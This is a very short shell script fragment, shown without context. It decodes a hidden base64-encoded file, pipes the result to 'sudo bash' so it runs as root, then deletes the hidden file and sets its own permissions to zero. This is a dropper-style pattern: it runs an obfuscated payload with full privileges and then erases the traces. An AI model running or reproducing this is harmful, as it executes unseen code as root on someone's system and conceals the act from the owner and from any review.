cat .hidden_script.sh | base64 --decode | sudo bash
rm .hidden_script.sh
chmod 000 $0
